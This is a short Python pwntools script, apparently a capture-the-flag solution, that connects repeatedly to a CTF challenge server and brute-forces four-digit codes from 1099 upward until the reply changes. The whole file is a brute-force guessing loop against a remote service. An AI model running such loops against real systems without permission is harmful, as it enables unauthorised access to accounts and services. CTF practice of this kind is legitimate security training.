from pwn import *

HOST = 'chall.ctf.nitdgplug.org'
PORT = 30005

value = 1099
for _ in range(5000):
  conn = remote(HOST, PORT)
  conn.recvline()
  data = '0'*(4-len(str(value))) + str(value)
  print(f'Trying {data}...')
  conn.sendline(data)
  rcv = (conn.recvline()).decode('ascii')
  print(rcv)
  if rcv != 'Too bad! Try again.\n':
    break
  value+=1
